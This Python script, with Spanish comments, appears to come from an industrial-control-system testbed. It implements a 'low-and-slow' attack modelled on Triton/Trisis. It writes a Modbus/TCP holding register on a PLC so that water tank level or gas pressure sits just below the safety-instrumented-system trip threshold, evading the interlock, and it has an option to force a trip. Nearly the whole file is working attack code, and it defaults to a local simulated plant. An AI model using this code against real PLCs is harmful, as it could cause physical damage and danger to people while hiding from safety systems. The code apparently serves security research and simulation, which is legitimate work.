#!/usr/bin/env python3
"""attacker/attack_triton_low_slow.py — Vector de Ataque Triton/Trisis (Low-and-Slow SIS Avoidance)

Inspirado en la amenaza ciberfísica Triton/Trisis (2017):
  1. Manipula variables de proceso escribiendo en el Holding Register 20 del PLC Modbus/TCP.
  2. En modo sigiloso, mantiene los valores en un margen controlado justo por debajo del umbral de disparo SIS:
     - Tanque SWaT T1: Mantiene nivel en 18.8 m³ (Límite SIS trip = 19.0 m³).
     - Presión de Gas: Mantiene presión en 178.5 PSI (Límite SIS trip = 180.0 PSI).
  3. Confirma la escritura mediante Readback sobre el socket Modbus y evalúa la lógica del SIS.
"""
from __future__ import annotations

import argparse
import logging
import sys
import time
from pathlib import Path
from typing import Dict, Any, Optional, Sequence

ROOT = Path(__file__).resolve().parent.parent
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

try:
    from pymodbus.client.sync import ModbusTcpClient
except ImportError:
    from pymodbus.client import ModbusTcpClient

from helics_sim.fed_sis import SafetyInstrumentedLogic, SafetyInterlockLimits
from physical.water.plant_water import TwoStageWaterPlant

logging.basicConfig(level=logging.INFO, format='[%(asctime)s][TRITON-ATTACK] %(message)s')
LOGGER = logging.getLogger('attack_triton_low_slow')


class TritonLowSlowAttack:
    """Ataque de manipulación progresiva con evasión de disparo de interlocks SIS."""

    HR_PROCESS: int = 20  # Holding register de variable de proceso (nivel/presión × 10)

    def __init__(self, target_sector: str = 'water', host: str = '127.0.0.1', port: int = 502) -> None:
        self.target_sector = target_sector
        self.host = host
        self.port = port
        self.sis_limits = SafetyInterlockLimits()
        self.sis_logic = SafetyInstrumentedLogic(self.sis_limits)

    def execute_stealth_manipulation(
        self,
        cycles: int = 3,
        host: Optional[str] = None,
        port: Optional[int] = None,
        force_trip: bool = False
    ) -> Dict[str, Any]:
        target_host = host or self.host
        target_port = port or self.port

        LOGGER.info("Iniciando ataque Triton Low-and-Slow en sector: %s (force_trip=%s) sobre %s:%d",
                    self.target_sector, force_trip, target_host, target_port)

        if force_trip:
            target_val = self.sis_limits.max_tank_level_m3 + 2.0 if self.target_sector == 'water' else self.sis_limits.max_gas_pressure_psi + 15.0
        else:
            target_val = self.sis_limits.max_tank_level_m3 - 0.2 if self.target_sector == 'water' else self.sis_limits.max_gas_pressure_psi - 1.5

        raw_val = int(round(target_val * 10))
        observed_val = target_val
        mode = 'TABLETOP_FALLBACK'

        # 1. Escritura y lectura confirmada vía socket Modbus TCP
        client = ModbusTcpClient(target_host, port=target_port, timeout=1.0)
        try:
            if client.connect():
                client.write_register(self.HR_PROCESS, raw_val)
                rr = client.read_holding_registers(self.HR_PROCESS, 1)
                if rr is not None and not rr.isError():
                    observed_val = rr.registers[0] / 10.0
                    mode = 'SOCKET_LIVE'
                    LOGGER.info("Proceso manipulado vía Modbus TCP (%s:%d): HR %d = %.2f",
                                target_host, target_port, self.HR_PROCESS, observed_val)
        except Exception as exc:
            LOGGER.warning("No se pudo conectar al PLC Modbus en %s:%d: %s. Aplicando manipulación in-process.",
                           target_host, target_port, exc)
        finally:
            try:
                client.close()
            except Exception:
                pass

        # 2. Evaluación con lógica SIS real
        results = []
        for i in range(cycles):
            if self.target_sector == 'water':
                state = {'water_t1_level': observed_val, 'gas_pressure': 145.0, 'grid_freq': 60.0}
            else:
                state = {'water_t1_level': 10.0, 'gas_pressure': observed_val, 'grid_freq': 60.0}

            must_trip, reason = self.sis_logic.evaluate_safety_state(state)
            LOGGER.info(
                "Ciclo %d/%d — Sector: %s | Valor: %.2f | SIS Tripped: %s",
                i + 1, cycles, self.target_sector, observed_val, must_trip
            )
            results.append({'cycle': i + 1, 'val': observed_val, 'sis_tripped': must_trip})
            time.sleep(0.02)

        sis_tripped = any(r['sis_tripped'] for r in results)
        return {
            'status': 'SUCCESS',
            'mode': mode,
            'sector': self.target_sector,
            'observed_val': observed_val,
            'sis_tripped': sis_tripped,
            'stealth_maintained': not sis_tripped
        }


def main(argv: Optional[Sequence[str]] = None) -> int:
    parser = argparse.ArgumentParser(description="CityLab Triton/Trisis Low-and-Slow Attack Vector")
    parser.add_argument("--host", default="127.0.0.1", help="Host Modbus PLC (default: 127.0.0.1)")
    parser.add_argument("--port", type=int, default=502, help="Puerto Modbus TCP (default: 502)")
    parser.add_argument("--sector", choices=['water', 'gas'], default='water', help="Sector objetivo")
    parser.add_argument("--cycles", type=int, default=3, help="Número de ciclos de manipulación")
    parser.add_argument("--force-trip", action="store_true", help="Forzar valor sobre umbral SIS para verificar disparo")
    args = parser.parse_args(argv)

    attacker = TritonLowSlowAttack(target_sector=args.sector, host=args.host, port=args.port)
    res = attacker.execute_stealth_manipulation(cycles=args.cycles, force_trip=args.force_trip)
    LOGGER.info("Resultado de ataque Triton: %s", res)
    return 0


if __name__ == '__main__':
    sys.exit(main())
